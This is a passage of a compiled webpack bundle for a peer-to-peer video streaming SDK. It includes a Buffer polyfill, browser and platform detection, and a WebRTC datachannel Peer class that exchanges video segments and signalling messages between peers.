        throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. ' + 'Received type ' + (typeof string === 'undefined' ? 'undefined' : _typeof(string)));
    }

    var len = string.length;
    var mustMatch = arguments.length > 2 && arguments[2] === true;
    if (!mustMatch && len === 0) return 0;

    // Use a for loop to avoid recursion
    var loweredCase = false;
    for (;;) {
        switch (encoding) {
            case 'ascii':
            case 'latin1':
            case 'binary':
                return len;
            case 'utf8':
            case 'utf-8':
                return utf8ToBytes(string).length;
            case 'ucs2':
            case 'ucs-2':
            case 'utf16le':
            case 'utf-16le':
                return len * 2;
            case 'hex':
                return len >>> 1;
            default:
                if (loweredCase) {
                    return mustMatch ? -1 : utf8ToBytes(string).length; // assume utf8
                }
                encoding = ('' + encoding).toLowerCase();
                loweredCase = true;
        }
    }
}
Buffer.byteLength = byteLength;

// This property is used by `Buffer.isBuffer` (and the `is-buffer` npm package)
// to detect a Buffer instance. It's not possible to use `instanceof Buffer`
// reliably in a browserify context because there could be multiple different
// copies of the 'buffer' package in use. This method works even for Buffer
// instances that were created from another copy of the `buffer` package.
// See: https://github.com/feross/buffer/issues/154
Buffer.prototype._isBuffer = true;

Buffer.prototype.copy = function copy(target, targetStart, start, end) {
    if (!Buffer.isBuffer(target)) throw new TypeError('argument should be a Buffer');
    if (!start) start = 0;
    if (!end && end !== 0) end = this.length;
    if (targetStart >= target.length) targetStart = target.length;
    if (!targetStart) targetStart = 0;
    if (end > 0 && end < start) end = start;

    // Copy 0 bytes; we're done
    if (end === start) return 0;
    if (target.length === 0 || this.length === 0) return 0;

    // Fatal error conditions
    if (targetStart < 0) {
        throw new RangeError('targetStart out of bounds');
    }
    if (start < 0 || start >= this.length) throw new RangeError('Index out of range');
    if (end < 0) throw new RangeError('sourceEnd out of bounds');

    // Are we oob?
    if (end > this.length) end = this.length;
    if (target.length - targetStart < end - start) {
        end = target.length - targetStart + start;
    }

    var len = end - start;

    if (this === target && typeof Uint8Array.prototype.copyWithin === 'function') {
        // Use built-in when available, missing from IE11
        this.copyWithin(targetStart, start, end);
    } else if (this === target && start < targetStart && targetStart < end) {
        // descending copy from end
        for (var i = len - 1; i >= 0; --i) {
            target[i + targetStart] = this[i + start];
        }
    } else {
        Uint8Array.prototype.set.call(target, this.subarray(start, end), targetStart);
    }

    return len;
};

function utf8ToBytes(string, units) {
    units = units || Infinity;
    var codePoint;
    var length = string.length;
    var leadSurrogate = null;
    var bytes = [];

    for (var i = 0; i < length; ++i) {
        codePoint = string.charCodeAt(i);

        // is surrogate component
        if (codePoint > 0xD7FF && codePoint < 0xE000) {
            // last char was a lead
            if (!leadSurrogate) {
                // no lead yet
                if (codePoint > 0xDBFF) {
                    // unexpected trail
                    if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD);
                    continue;
                } else if (i + 1 === length) {
                    // unpaired lead
                    if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD);
                    continue;
                }

                // valid lead
                leadSurrogate = codePoint;

                continue;
            }

            // 2 leads in a row
            if (codePoint < 0xDC00) {
                if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD);
                leadSurrogate = codePoint;
                continue;
            }

            // valid surrogate pair
            codePoint = (leadSurrogate - 0xD800 << 10 | codePoint - 0xDC00) + 0x10000;
        } else if (leadSurrogate) {
            // valid bmp char, but last char was a lead
            if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD);
        }

        leadSurrogate = null;

        // encode utf8
        if (codePoint < 0x80) {
            if ((units -= 1) < 0) break;
            bytes.push(codePoint);
        } else if (codePoint < 0x800) {
            if ((units -= 2) < 0) break;
            bytes.push(codePoint >> 0x6 | 0xC0, codePoint & 0x3F | 0x80);
        } else if (codePoint < 0x10000) {
            if ((units -= 3) < 0) break;
            bytes.push(codePoint >> 0xC | 0xE0, codePoint >> 0x6 & 0x3F | 0x80, codePoint & 0x3F | 0x80);
        } else if (codePoint < 0x110000) {
            if ((units -= 4) < 0) break;
            bytes.push(codePoint >> 0x12 | 0xF0, codePoint >> 0xC & 0x3F | 0x80, codePoint >> 0x6 & 0x3F | 0x80, codePoint & 0x3F | 0x80);
        } else {
            throw new Error('Invalid code point');
        }
    }

    return bytes;
}

// ArrayBuffer or Uint8Array objects from other contexts (i.e. iframes) do not pass
// the `instanceof` check but they should be treated as of that type.
// See: https://github.com/feross/buffer/issues/166
function isInstance(obj, type) {
    return obj instanceof type || obj != null && obj.constructor != null && obj.constructor.name != null && obj.constructor.name === type.name;
}
function numberIsNaN(obj) {
    // For IE11 support
    return obj !== obj; // eslint-disable-line no-self-compare
}

/***/ }),
/* 4 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var device = {
    ANDROID_WEB: 'android-web',
    IOS_WEB: 'iOS-web',
    PC_NATIVE: 'PC-native',
    PC_WEB: 'PC-web'
};

var os = {
    //网络类型 wifi 4g 3g 2g unknown or '' non_network cellular
    getNetType: function getNetType() {
        var netType = (new RegExp('nettype\\/(\\w*)').exec(_getUA()) || [, ''])[1].toLowerCase();
        if (!netType && navigator.connection) {
            /*
                "bluetooth",
                "cellular",
                "ethernet",
                "mixed",
                "none",
                "other",
                "unknown",
                "wifi",
                "wimax"
             */
            var type = navigator.connection.type;
            switch (type) {
                case 'ethernet':
                    netType = 'ethernet';
                    break;
                case 'cellular':
                    // netType = '4g';
                    netType = 'cellular';
                    break;
                default:
                    netType = 'wifi';
            }
        }
        return netType;
    },
    //获取设备类型
    getPlatform: function getPlatform() {
        if (os.isAndroid()) {
            return device.ANDROID_WEB;
        } else if (os.isIOS()) {
            return device.IOS_WEB;
        } else if (os.isElectron()) {
            return device.PC_NATIVE;
        } else {
            return device.PC_WEB;
        }
    },
    isX5: function isX5() {
        return this.isAndroid() && /\s(TBS|X5Core)\/[\w\.\-]+/i.test(_getUA());
    },
    isPC: function isPC() {
        return !_toNum(_platform('os ')) && !_toNum(_platform('android[/ ]'));
    },
    isIOS: function isIOS() {
        return _toNum(_platform('os '));
    },
    isAndroid: function isAndroid() {
        return _toNum(_platform('android[/ ]'));
    },
    isIOSSafari: function isIOSSafari() {
        return this.isIOS() && this.isSafari();
    },
    isElectron: function isElectron() {
        return (/electron/i.test(_getUA())
        );
    },
    isMobile: function isMobile() {
        return os.isAndroid() || os.isIOS();
    },
    isSafari: function isSafari() {
        return (/^((?!chrome|android).)*safari/i.test(_getUA())
        );
    },
    isFirefox: function isFirefox() {
        return (/firefox/i.test(_getUA())
        );
    },
    isChrome: function isChrome() {
        return (/chrome/i.test(_getUA())
        );
    },
    isLocalHost: function isLocalHost() {
        return location.hostname === 'localhost';
    },

    device: device,

    getBrowser: function getBrowser() {
        if (os.isX5()) {
            return 'X5';
        } else if (os.isChrome()) {
            return 'Chrome';
        } else if (os.isFirefox()) {
            return 'Firefox';
        } else if (os.isIOSSafari()) {
            return 'iOS-Safari';
        } else if (os.isSafari()) {
            return 'Mac-Safari';
        } else {
            return 'Unknown';
        }
    }
};

function _getUA() {
    return navigator.userAgent.toLowerCase();
}

function _platform(os) {
    var ver = '' + (new RegExp(os + '(\\d+((\\.|_)\\d+)*)').exec(_getUA()) || [, 0])[1];
    // undefined < 3 === false, but null < 3 === true
    return ver || undefined;
}

function _toNum(str) {
    return parseFloat((str || "").replace(/\_/g, '.')) || 0;
}

module.exports = os;

/***/ }),
/* 5 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.EngineBase = exports.utils = exports.WebsocketClient = exports.SegmentManager = exports.Segment = exports.PeerManager = exports.BtScheduler = exports.config = exports.Tracker = exports.getPeersThrottle = exports.Buffer = exports.Server = exports.Events = exports.Peer = undefined;

var _peer = __webpack_require__(6);

var _peer2 = _interopRequireDefault(_peer);

var _events = __webpack_require__(2);

var _events2 = _interopRequireDefault(_events);

var _server = __webpack_require__(26);

var _server2 = _interopRequireDefault(_server);

var _getPeersThrottle = __webpack_require__(8);

var _getPeersThrottle2 = _interopRequireDefault(_getPeersThrottle);

var _trackerClient = __webpack_require__(30);

var _trackerClient2 = _interopRequireDefault(_trackerClient);

var _config = __webpack_require__(32);

var _config2 = _interopRequireDefault(_config);

var _btScheduler = __webpack_require__(33);

var _btScheduler2 = _interopRequireDefault(_btScheduler);

var _peerManager = __webpack_require__(17);

var _peerManager2 = _interopRequireDefault(_peerManager);

var _segment = __webpack_require__(13);

var _segment2 = _interopRequireDefault(_segment);

var _segmentCache = __webpack_require__(35);

var _segmentCache2 = _interopRequireDefault(_segmentCache);

var _websocketClient = __webpack_require__(15);

var _websocketClient2 = _interopRequireDefault(_websocketClient);

var _utils = __webpack_require__(36);

var _utils2 = _interopRequireDefault(_utils);

var _engineBase = __webpack_require__(37);

var _engineBase2 = _interopRequireDefault(_engineBase);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

var Buffer = __webpack_require__(3).Buffer;
exports.Peer = _peer2.default;
exports.Events = _events2.default;
exports.Server = _server2.default;
exports.Buffer = Buffer;
exports.getPeersThrottle = _getPeersThrottle2.default;
exports.Tracker = _trackerClient2.default;
exports.config = _config2.default;
exports.BtScheduler = _btScheduler2.default;
exports.PeerManager = _peerManager2.default;
exports.Segment = _segment2.default;
exports.SegmentManager = _segmentCache2.default;
exports.WebsocketClient = _websocketClient2.default;
exports.utils = _utils2.default;
exports.EngineBase = _engineBase2.default;

/***/ }),
/* 6 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _peerChannel = __webpack_require__(22);

var _peerChannel2 = _interopRequireDefault(_peerChannel);

var _events = __webpack_require__(1);

var _events2 = _interopRequireDefault(_events);

var _events3 = __webpack_require__(2);

var _events4 = _interopRequireDefault(_events3);

var _toolFuns = __webpack_require__(0);

var _segment = __webpack_require__(13);

var _segment2 = _interopRequireDefault(_segment);

var _platform = __webpack_require__(4);

var _platform2 = _interopRequireDefault(_platform);

var _sdp = __webpack_require__(23);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var Buffer = __webpack_require__(3).Buffer;

// const DOWNLOAD_TIMEOUT = 5;            // p2p下载超时时间，单位秒
var DC_TOLERANCE = 2; // 请求超时或错误多少次阻塞该peer
var DEFAULT_PACKET_SIZE = 64 * 1000; // 默认每次通过datachannel发送的包的大小 不能发送大于64KB的包
var ALPHA = 0.6; // weight平滑系数
var SIGNAL_PACK_VER = 1; // 信令压缩版本号

var Peer = function (_EventEmitter) {
    _inherits(Peer, _EventEmitter);

    _createClass(Peer, null, [{
        key: 'VERSION',
        get: function get() {
            return '5';
        }
    }]);

    function Peer(engine, peerId, remotePeerId, isInitiator, config, sequential) {
        var options = arguments.length > 6 && arguments[6] !== undefined ? arguments[6] : {};

        _classCallCheck(this, Peer);

        var _this = _possibleConstructorReturn(this, (Peer.__proto__ || Object.getPrototypeOf(Peer)).call(this));

        _this.engine = engine;
        _this.channel = engine.fetcher.channelId;
        _this.logger = engine.logger;
        _this.config = config;
        _this.isInitiator = isInitiator;
        _this.options = options;
        _this.typeExpected = sequential;
        _this.remotePeerId = remotePeerId;
        _this.intermediator = options.intermediator || null;
        // if (this.intermediator) this.logger.info(`${remotePeerId} intermediator is ${this.intermediator}`);
        // this.channelId = isInitiator ? peerId + '-' + remotePeerId : remotePeerId + '-' + peerId;                    //标识该channel
        _this.channelId = isInitiator ? peerId + '-' + remotePeerId : remotePeerId + '-' + peerId; //标识该channel
        // console.warn(`this.channelId ${this.channelId}`);
        _this.cpr = 0; // 信令压缩
        _this.platform = 'unknown';
        _this.mobile = false; // 是否移动端
        _this.mobileWeb = false; // 是否移动web端
        _this.connected = false;
        _this.msgQueue = [];
        _this.miss = 0; // 超时或者错误的次数
        // this.bitset;
        _this.notifySet = new Set();
        _this.bufArr = [];

        _this.packetSize = DEFAULT_PACKET_SIZE; //每个数据包的大小

        // P2P连接超时控制
        _this.connTimeout = setTimeout(function () {
            _this.logger.warn('dc ' + _this.channelId + ' connection timeout');
            _this.emit(_events4.default.DC_ERROR, true);
        }, 25000);

        //下载控制
        _this.sendReqQueue = []; // 发送的请求的队列    队列头部优先级最高 sn
        _this.downloading = false;
        _this.uploading = false;
        _this.choked = false;
        _this.downloadListeners = [];
        _this.pieceMsg = {};

        // 统计
        // trequest = performance.now();
        _this.timeSendRequest = 0; // 发送request的时刻 毫秒    用于计算节点权重
        _this.timeReceivePiece = 0; // 接收到piece的时刻 毫秒    用于shouldWaitForRemain
        _this.timeSendPiece = 0; // 发送piece的时刻 毫秒
        _this.weight = 0; // 平均速度 byte/ms
        _this.peersConnected = 1; // 已连接的节点数
        _this.timeJoin = (0, _toolFuns.getCurrentTs)(); // 加入时间，用于get peers
        _this.continuousHits = 0; // 连续请求ts成功次数 用于直播订阅
        _this.uploadSpeed = 0; // 上行速度，byte/ms  用于订阅模式
        _this.gotPeers = false; // 是否向该peer请求过节点

        // 如果指定了stun
        var webRTCConfig = {};
        // console.warn(this.options.stuns)
        if (_this.options.stuns.length > 0) {
            var urls = [];
            _this.options.stuns.forEach(function (url) {
                _this.logger.info('use stun ' + url);
                urls.push({ urls: url });
            });
            webRTCConfig.iceServers = urls;
        }
        if (_this.config.webRTCConfig) {
            webRTCConfig = _extends({}, _this.config.webRTCConfig, webRTCConfig);
        }

        // playlist
        _this.playlistMap = new Map(); // url -> {data, seq} seq是m3u8最大的ts序号

        _this._datachannel = new _peerChannel2.default({
            initiator: isInitiator,
            channelName: _this.channelId,
            trickle: options.trickle || false,
            config: webRTCConfig
        });
        _this._init(_this._datachannel);

        // this.downloadNum = 0;                       // 正在下载的请求个数
        _this.dataExchangeTs = _this.timeJoin; // 最近发生数据交换的时间戳

        _this.startSN = Number.MAX_SAFE_INTEGER; // 当前peer拥有的最小的SN
        _this.endSN = -1; // 当前peer拥有的最大的SN

        _this.liveEdgeSN = 0; // 当前peer播放的最新SN
        _this.subscribeEdgeSN = 0; // 当前订阅发送的最新sn
        return _this;
    }

    _createClass(Peer, [{
        key: 'addDownloadListener',
        value: function addDownloadListener(handler) {
            this.downloadListeners.push({
                handler: handler
            });
        }
    }, {
        key: '_init',
        value: function _init(datachannel) {
            var _this2 = this;

            datachannel.on('error', function (err) {
                // logger.warn('datachannel error', err);
                _this2.emit(_events4.default.DC_ERROR, true);
            });

            datachannel.on('signal', function (data) {
                // console.warn(`act origin`)
                // console.warn(JSON.stringify(data))
                if (_this2.cpr === SIGNAL_PACK_VER) {
                    data = (0, _sdp.pack)(data);
                }
                // console.warn(JSON.stringify(data))
                // if (data) {
                //     console.warn(`unpack`)
                //     console.warn(unpack(data))
                // }
                if (data) _this2.emit(_events4.default.DC_SIGNAL, data);
            });

            var _onConnect = function _onConnect() {

                _this2.logger.info('datachannel CONNECTED to ' + _this2.remotePeerId + ' from ' + (_this2.intermediator ? 'peer' : 'server'));
                _this2.connected = true;
                clearTimeout(_this2.connTimeout); // TODO 验证

                _this2.emit(_events4.default.DC_OPEN);
                //测试延迟
                // this._sendPing();
                //发送消息队列中的消息
                while (_this2.msgQueue.length > 0) {
                    var msg = _this2.msgQueue.shift();
                    _this2.emit(msg.event, msg);
                }
            };

            datachannel.once('connect', _onConnect);

            datachannel.on('data', function (data) {
                // console.warn(`dc ondata`)
                // console.warn(data)
                var logger = _this2.logger;

                if (typeof data === 'string') {

                    var msg = JSON.parse(data);

                    //如果还没连接，则先保存在消息队列中
                    if (!_this2.connected) {
                        _this2.msgQueue.push(msg);
                        // _onConnect();
                        return;
                    }
                    var event = msg.event;

                    if (event !== _events4.default.DC_PLAYLIST && event !== _events4.default.DC_PEER_SIGNAL) {
                        // if (true) {
                        logger.debug('datachannel receive string: ' + data + ' from ' + _this2.remotePeerId);
                    } else {
                        logger.debug('datachannel receive event: ' + event + ' from ' + _this2.remotePeerId);
                    }

                    switch (event) {
                        case _events4.default.DC_HAVE:
                            _this2.emit(msg.event, msg);
                            if (!msg.sn) return;
                            if (_this2.config.live) {
                                _this2.liveEdgeSN = msg.sn;
                            } else {
                                if (msg.sn < _this2.startSN) {
                                    _this2.startSN = msg.sn;
                                    // console.warn(`this.startSN ${this.startSN}`);
                                }
                                if (msg.sn > _this2.endSN) {
                                    _this2.endSN = msg.sn;
                                }
                            }
                            break;
                        // case Events.DC_LOST:
                        //     if (!msg.sn) return;
                        //     if (msg.sn > this.startSN) {
                        //         this.startSN = msg.sn+1;
                        //         // console.warn(`this.startSN ${this.startSN}`);
                        //     }
                        //     console.warn(`peer startSN ${this.startSN}`)
                        //     this.emit(msg.event, msg);
                        //     break;
                        case _events4.default.DC_PIECE:
                            _this2.downloading = true; // 订阅
                            _this2.dataExchangeTs = (0, _toolFuns.getCurrentTs)();
                            _this2.timeReceivePiece = performance.now();
                            _this2.pieceMsg = msg;
                            _this2._prepareForBinary(msg.attachments, msg.seg_id, msg.sn, msg.size);
                            _this2.emit(msg.event, msg);
                            break;
                        case _events4.default.DC_PIECE_NOT_FOUND:
                            if (!_this2._sendNextReq()) {
                                _this2.downloading = false;
                            }
                            _this2.emit(msg.event, msg);
                            break;
                        case _events4.default.DC_REQUEST:
                            _this2._handleRequestMsg(msg);
                            break;
                        case _events4.default.DC_PIECE_ACK:
                            _this2.dataExchangeTs = (0, _toolFuns.getCurrentTs)();
                            _this2._handlePieceAck(msg);
                            _this2.emit(msg.event, msg);
                            break;
                        case _events4.default.DC_STATS:
                            _this2._handleStats(msg);
                            break;
                        case _events4.default.DC_PLAYLIST:
                            // console.warn(JSON.stringify(msg));
                            if (_this2.config.sharePlaylist) {
                                _this2._handlePlaylist(msg);
                            }
                            break;
                        case _events4.default.DC_METADATA:
                            // bug 没收到
                            _this2._handleMetadata(msg);
                            break;
                        case _events4.default.DC_PIECE_ABORT:
                            if (_this2.downloading) {
                                // this.downloading = false;
                                if (_this2.downloadListeners.length > 0) {
                                    var _iteratorNormalCompletion = true;
                                    var _didIteratorError = false;
                                    var _iteratorError = undefined;

                                    try {
                                        for (var _iterator = _this2.downloadListeners[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
                                            var item = _step.value;
                                            var handler = item.handler;

                                            handler(_this2.bufSN, _this2.segId, true, 'aborted by upstream peer');
                                        }
                                    } catch (err) {
                                        _didIteratorError = true;
                                        _iteratorError = err;
                                    } finally {
                                        try {
                                            if (!_iteratorNormalCompletion && _iterator.return) {
                                                _iterator.return();
                                            }
                                        } finally {
                                            if (_didIteratorError) {
                                                throw _iteratorError;
                                            }
                                        }
                                    }

                                    _this2.downloadListeners = [];
                                }
                                _this2.emit(_events4.default.DC_PIECE_ABORT, msg);
                            }
                            break;
                        case _events4.default.DC_CHOKE:
                            logger.info('choke peer ' + _this2.remotePeerId);
                            _this2.choked = true;
                            break;
                        case _events4.default.DC_UNCHOKE:
                            logger.info('unchoke peer ' + _this2.remotePeerId);
                            _this2.choked = false;
                            break;
                        default:
                            _this2.emit(msg.event, msg);
                    }
                } else {
                    //binary data
                    // console.warn(`datachannel receive binary data size ${data.byteLength}`);
                    if (!_this2.downloading) {
                        logger.error('peer is not downloading, data size ' + data.byteLength + ' pieceMsg ' + JSON.stringify(_this2.pieceMsg));
                        return;
                    }
                    // test
                    // setTimeout(() => {
                    //     this._handleBinaryMsg(data);
                    // }, 3000);
                    _this2._handleBinaryMsg(data);
                }
            });

            datachannel.once('close', function () {
                _this2.emit(_events4.default.DC_CLOSE);
            });

            datachannel.on('iceStateChange', function (iceConnectionState, iceGatheringState) {
                if (iceConnectionState === 'disconnected') {
                    _this2.logger.warn(_this2.remotePeerId + ' disconnected');
                    _this2.connected = false;
                }
            });
        }
    }, {
        key: 'sendJson',
        value: function sendJson(json) {
            if (json.event !== _events4.default.DC_PLAYLIST && json.event !== _events4.default.DC_PEER_SIGNAL) {
                // if (true) {
                this.logger.debug('dc bufferSize ' + this._datachannel.bufferSize + ' send ' + JSON.stringify(json) + ' to ' + this.remotePeerId);
            } else {
                this.logger.debug('dc send event ' + json.event + ' to ' + this.remotePeerId);
            }
            return this.send(JSON.stringify(json));
        }
    }, {
        key: 'send',
        value: function send(data) {
            if (this._datachannel && this._datachannel.connected) {
                try {
                    this._datachannel.send(data);
                    return true;
                } catch (e) {
                    this.logger.warn('datachannel ' + this.channelId + ' send data failed, close it');
                    this.emit(_events4.default.DC_ERROR, false);
                }
            }
            return false;
        }
    }, {
        key: 'sendMsgHave',
        value: function sendMsgHave(sn, segId) {
            // sn = -1;   // test
            this.sendJson({
                event: _events4.default.DC_HAVE,
                sn: sn,
                seg_id: segId
            });
        }
    }, {
        key: 'sendPieceNotFound',
        value: function sendPieceNotFound(sn, segId) {
            this.uploading = false;
            this.sendJson({
                event: _events4.default.DC_PIECE_NOT_FOUND,
                seg_id: segId,
                sn: sn
            });
        }
    }, {
        key: 'sendPeers',
        value: function sendPeers(peers) {
            this.sendJson({
                event: _events4.default.DC_PEERS,
                peers: peers
            });
        }
    }, {
        key: 'sendPeersRequest',
        value: function sendPeersRequest() {
            this.sendJson({
                event: _events4.default.DC_GET_PEERS
            });
        }
    }, {
        key: 'sendSubscribe',
        value: function sendSubscribe() {
            this.sendJson({
                event: _events4.default.DC_SUBSCRIBE
            });
        }
    }, {
        key: 'sendUnsubscribe',
        value: function sendUnsubscribe(reason) {
            this.resetContinuousHits();
            this.sendJson({
                event: _events4.default.DC_UNSUBSCRIBE,
                reason: reason
            });
        }
    }, {
        key: 'sendSubscribeReject',
        value: function sendSubscribeReject(reason) {
            this.sendJson({
                event: _events4.default.DC_SUBSCRIBE_REJECT,
                reason: reason
            });
        }
    }, {
        key: 'sendSubscribeAccept',
        value: function sendSubscribeAccept(level) {
            this.sendJson({
                event: _events4.default.DC_SUBSCRIBE_ACCEPT,
                level: level
            });
        }
    }, {
        key: 'sendSubscribeLevel',
        value: function sendSubscribeLevel(level) {
            this.sendJson({
                event: _events4.default.DC_SUBSCRIBE_LEVEL,
                level: level
            });
        }
    }, {
        key: 'sendMsgStats',
        value: function sendMsgStats(totalConns, children) {
            var msg = {
                event: _events4.default.DC_STATS,
                total_conns: totalConns,
                children: children
            };
            this.sendJson(msg);
        }
    }, {
        key: 'sendMsgPlaylist',
        value: function sendMsgPlaylist(url, data, seq) {
            if (this.playlistMap.has(url)) {
                var playlist = this.playlistMap.get(url);
                if (playlist.seq >= seq) return;
            }
            var msg = {
                event: _events4.default.DC_PLAYLIST,
                url: url,
                data: data,
                seq: seq
            };
            this.sendJson(msg);
        }
    }, {
        key: 'sendMsgSignal',
        value: function sendMsgSignal(toPeerId, fromPeerId, data) {
            return this.sendJson({
                event: _events4.default.DC_PEER_SIGNAL,
                action: 'signal',
                to_peer_id: toPeerId,
                from_peer_id: fromPeerId,
                data: data
            });
        }
    }, {
        key: 'sendMsgSignalReject',
        value: function sendMsgSignalReject(toPeerId, fromPeerId, reason) {
            var fatal = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : false;

            return this.sendJson({
                event: _events4.default.DC_PEER_SIGNAL,
                action: 'reject',
                to_peer_id: toPeerId,
                from_peer_id: fromPeerId,
                reason: reason,
                fatal: fatal
            });
        }
    }, {
        key: 'sendMetaData',
        value: function sendMetaData(field, sequential) {
            var peers = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 0;

            // 开始计时
            if (this.isInitiator) this.timeSendRequest = performance.now();

            this.sendJson({ //向peer发送bitfield
                event: _events4.default.DC_METADATA,
                field: field,
                platform: _events4.default.DC_PLAT_WEB,
                mobile: !!_platform2.default.isMobile(),
                channel: this.channel, // 频道ID
                version: "0.0.1", // SDK版本号
                sequential: sequential,
                peers: peers
            });
        }
    }, {
        key: 'sendPartialBuffer',
        value: function sendPartialBuffer(pieceMsg, bufArr) {
            var ext = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : {};

            this.sendMsgPiece(pieceMsg, ext);
            for (var j = 0; j < bufArr.length; j++) {
                this.send(bufArr[j]);
            }
        }
    }, {
        key: 'sendMsgPiece',
        value: function sendMsgPiece(msg) {
            var ext = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

            if (!msg.ext) msg.ext = {};
            if (msg.ext.from && ext.from) {
                ext.from = msg.ext.from + '->' + ext.from;
            }
            if (ext.incompletes && msg.ext.incompletes) {
                ext.incompletes += msg.ext.incompletes;
            }
            ext = Object.assign({}, msg.ext, ext);
            var msgToSend = _extends({}, msg, {
                ext: ext
            });
            // console.warn(`sendMsgPiece ${JSON.stringify(msg)}`);
            this.sendJson(msgToSend);
        }
    }, {
        key: 'sendBuffer',
        value: function sendBuffer(sn, segId, payload) {
            var ext = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : {};

            //开始计时
            // this.uploadTimeout = window.setTimeout(this._uploadtimeout.bind(this), this.config.dcUploadTimeout*1000);

            // if (this.uploading && ext.test) return;

            var dataSize = payload.byteLength,
                //二进制数据大小
            // packetSize = DEFAULT_PACKET_SIZE,                          //每个数据包的大小
            remainder = 0,
                //最后一个包的大小
            attachments = 0; //分多少个包发
            if (dataSize % this.packetSize === 0) {
                attachments = dataSize / this.packetSize;
            } else {
                attachments = Math.floor(dataSize / this.packetSize) + 1;
                remainder = dataSize % this.packetSize;
            }
            var response = {
                event: _events4.default.DC_PIECE,
                // ext,
                attachments: attachments,
                // attachments: 1,           // test
                seg_id: segId,
                sn: sn,
                size: dataSize
                // size: 1000          // test
            };
            this.sendMsgPiece(response, ext);
            // console.warn(`send segment to ${this.remotePeerId} ${JSON.stringify(response)} packetSize ${this.packetSize}`);

            var bufArr = dividePayload(payload, this.packetSize, attachments, remainder);
            for (var j = 0; j < bufArr.length; j++) {
                this.send(bufArr[j]);
            }

            this.uploading = false;

            // test
            // for (let j = 0; j < bufArr.length-1; j++) {
            //     this.send(bufArr[j]);
            //     console.warn(`send buffer ${j} of ${sn}`)
            // }
            // this.sendMsgPieceAbort('test');
            // this.sendPieceNotFound(sn, segId);

            // setTimeout(() => {
            //     this.send(bufArr[bufArr.length-1]);
            //     console.warn(`send buffer ${bufArr.length-1} of ${sn}`)
            // }, 2000)

            // test
            // this.send(new ArrayBuffer(1000))

            // 计时
            this.timeSendPiece = performance.now();
        }
    }, {
        key: 'requestDataById',


        // cancelRequestById(segId) {
        //     this.sendReqQueue = this.sendReqQueue.filter(msg => msg.seg_id !== segId);
        // }
        //
        // cancelRequestBySN(sn) {
        //     this.sendReqQueue = this.sendReqQueue.filter(msg => msg.sn !== sn);
        // }

        value: function requestDataById(segId, sn) {
            var urgent = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : false;
            //由于需要阻塞下载数据，因此request请求用新的API
            // this.logger.info(`requestDataById downloadNum ${this.downloadNum}`);
            var msg = {
                event: _events4.default.DC_REQUEST,
                seg_id: segId,
                sn: sn,
                urgent: urgent
            };
            if (this.downloading) {
                this.logger.info('add req ' + segId + ' in queue');
                urgent ? this.sendReqQueue.unshift(msg) : this.sendReqQueue.push(msg);
            } else {
                this._realRequestData(msg);
            }
        }
    }, {
        key: 'requestDataBySN',
        value: function requestDataBySN(sn) {
            var urgent = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;

            // console.warn(`requestDataBySN downloadNum ${this.downloadNum}`);
            var msg = {
                event: _events4.default.DC_REQUEST,
                sn: sn, //ts数据的播放序号
                urgent: urgent //是否紧急
            };
            if (this.downloading) {
                this.logger.info('add req ' + sn + ' in queue');
                urgent ? this.sendReqQueue.unshift(msg) : this.sendReqQueue.push(msg);
            } else {
                this._realRequestData(msg);
            }
        }
    }, {
        key: '_realRequestData',
        value: function _realRequestData(msg) {
            // test
            // setTimeout(() => {
            //     this.sendJson(msg);
            // }, 3000);

            this.sendJson(msg);

            // 开始计时
            this.timeSendRequest = performance.now();
            this.downloading = true;
            // this.pieceMsg = {};           // 重置
            // this.requestTimeout = window.setTimeout(() => {
            //
            //     this.loadtimeout(sn);
            //
            // }, DOWNLOAD_TIMEOUT * 1000);

            //urgent请求才计时
            // if (urgent) {
            //     this.requestTimeout = window.setTimeout(this._loadtimeout.bind(this), this.config.dcRequestTimeout*1000);
            // }
        }

        // 如果下载速度大于剩余部分需要的最低下载速度，则继续等待
        // remainLoadTime: ms

    }, {
        key: 'shouldWaitForRemain',
        value: function shouldWaitForRemain(remainLoadTime) {
            if (this.bufArr.length === 0) return false;
            if (this.timeReceivePiece === 0) return false;
            this.logger.warn(this.bufArr.length + ' of ' + this.pieceMsg.attachments + ' packets loaded');
